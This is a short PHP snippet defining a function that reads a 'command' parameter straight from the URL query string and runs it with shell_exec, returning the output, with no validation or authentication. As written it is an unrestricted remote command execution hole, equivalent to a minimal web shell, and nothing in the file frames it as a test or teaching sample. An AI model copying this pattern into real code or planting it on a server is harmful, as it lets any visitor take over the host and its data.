<?php

function run_command() {
    $command = $_GET['command'];
    return shell_exec($command);
}
